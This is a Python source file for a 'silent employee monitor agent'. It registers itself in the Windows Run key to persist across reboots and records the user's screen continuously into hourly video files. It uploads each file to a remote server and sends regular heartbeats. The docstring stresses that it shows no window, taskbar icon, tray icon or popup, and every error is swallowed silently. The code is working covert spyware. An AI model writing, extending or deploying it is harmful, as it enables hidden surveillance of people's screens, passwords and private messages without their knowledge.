import os
import sys
import time
import json
import socket
import platform
import threading
from datetime import datetime
import urllib.request
import urllib.error

# Windows Registry module
if sys.platform == 'win32':
    import winreg

# Ensure dependencies are available
import requests
import cv2
import numpy as np
import mss

# Application Data Directory for ABCBuild Agent
if sys.platform == 'win32':
    APP_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'ABCBuildAgent')
else:
    APP_DIR = os.path.join(os.path.expanduser('~'), '.abcbuild_agent')

os.makedirs(APP_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(APP_DIR, 'config.json')

DEFAULT_CONFIG = {
    "server_url": "http://127.0.0.1:8000",
    "employee_code": "EMP001",
    "employee_name": "Employee 1",
    "fps": 2,
    "chunk_duration_minutes": 60, # 1 Hour clips
    "target_width": 1280,
    "target_height": 720
}

def ensure_windows_startup():
    """Ensure agent automatically runs every time Windows boots up (HKCU Run Key)."""
    if sys.platform != 'win32':
        return
    try:
        exe_path = os.path.abspath(sys.argv[0])
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ABCBuildAgent", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except Exception:
        pass


def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                user_cfg = json.load(f)
                cfg = DEFAULT_CONFIG.copy()
                cfg.update(user_cfg)
                return cfg
        except Exception:
            pass
    
    # Also check current executable directory for fallback config.json
    local_cfg = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), 'config.json')
    if os.path.exists(local_cfg):
        try:
            with open(local_cfg, 'r') as f:
                user_cfg = json.load(f)
                cfg = DEFAULT_CONFIG.copy()
                cfg.update(user_cfg)
                # Save to APP_DIR
                with open(CONFIG_FILE, 'w') as out_f:
                    json.dump(cfg, out_f, indent=4)
                return cfg
        except Exception:
            pass

    return DEFAULT_CONFIG


class SilentEmployeeMonitorAgent:
    """
    Completely Silent Background Screen Recorder Agent.
    NO Windows, NO Taskbar Icon, NO Tray Icon, NO Popups.
    """
    def __init__(self):
        self.config = load_config()
        self.hostname = socket.gethostname()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.temp_dir = os.path.join(APP_DIR, 'temp_chunks')
        os.makedirs(self.temp_dir, exist_ok=True)
        self.is_running = True

    def register_device(self):
        server_url = self.config['server_url'].rstrip('/')
        endpoint = f"{server_url}/api/agent/register/"
        payload = {
            "employee_code": self.config['employee_code'],
            "employee_name": self.config.get('employee_name', self.config['employee_code']),
            "employee_email": f"{self.config['employee_code']}@company.local",
            "hostname": self.hostname,
            "os_info": self.os_info
        }
        try:
            requests.post(endpoint, json=payload, timeout=10)
        except Exception:
            pass

    def heartbeat_thread(self):
        server_url = self.config['server_url'].rstrip('/')
        endpoint = f"{server_url}/api/agent/ping/"
        payload = {"employee_code": self.config['employee_code'], "hostname": self.hostname}
        while self.is_running:
            try:
                requests.post(endpoint, json=payload, timeout=5)
            except Exception:
                pass
            time.sleep(60)

    def upload_chunk_async(self, file_path, recorded_at_iso, duration_seconds):
        server_url = self.config['server_url'].rstrip('/')
        endpoint = f"{server_url}/api/agent/upload/"
        if not os.path.exists(file_path):
            return

        try:
            with open(file_path, 'rb') as f:
                files = {'video_chunk': (os.path.basename(file_path), f, 'video/webm')}
                data = {
                    'employee_code': self.config['employee_code'],
                    'recorded_at': recorded_at_iso,
                    'duration_seconds': duration_seconds
                }
                res = requests.post(endpoint, data=data, files=files, timeout=60)
                if res.status_code == 200:
                    try:
                        os.remove(file_path)
                    except OSError:
                        pass
        except Exception:
            pass

    def run(self):
        ensure_windows_startup()
        self.register_device()

        # Start heartbeat in background daemon thread
        threading.Thread(target=self.heartbeat_thread, daemon=True).start()

        fps = max(1, min(5, int(self.config['fps'])))
        chunk_seconds = int(self.config['chunk_duration_minutes'] * 60) # Default 60 mins (1 hour)
        width = int(self.config['target_width'])
        height = int(self.config['target_height'])

        with mss.mss() as sct:
            monitor = sct.monitors[1]
            
            while self.is_running:
                timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
                recorded_at_iso = datetime.now().isoformat()
                output_filename = f"silent_{self.config['employee_code']}_{timestamp_str}.webm"
                output_filepath = os.path.join(self.temp_dir, output_filename)

                fourcc = cv2.VideoWriter_fourcc(*'VP80')
                out = cv2.VideoWriter(output_filepath, fourcc, fps, (width, height))

                if not out.isOpened():
                    fourcc = cv2.VideoWriter_fourcc(*'XVID')
                    output_filename = output_filename.replace('.webm', '.avi')
                    output_filepath = os.path.join(self.temp_dir, output_filename)
                    out = cv2.VideoWriter(output_filepath, fourcc, fps, (width, height))

                start_time = time.time()
                frame_interval = 1.0 / fps
                frames_captured = 0

                try:
                    while (time.time() - start_time) < chunk_seconds and self.is_running:
                        loop_start = time.time()
                        
                        sct_img = sct.grab(monitor)
                        frame = np.array(sct_img)
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                        frame_resized = cv2.resize(frame, (width, height))

                        out.write(frame_resized)
                        frames_captured += 1

                        elapsed = time.time() - loop_start
                        sleep_time = max(0.001, frame_interval - elapsed)
                        time.sleep(sleep_time)

                except Exception:
                    pass
                finally:
                    out.release()

                actual_duration = int(time.time() - start_time)
                if frames_captured > 0 and os.path.exists(output_filepath):
                    # Launch upload thread silently
                    threading.Thread(
                        target=self.upload_chunk_async,
                        args=(output_filepath, recorded_at_iso, actual_duration),
                        daemon=True
                    ).start()

if __name__ == '__main__':
    agent = SilentEmployeeMonitorAgent()
    agent.run()
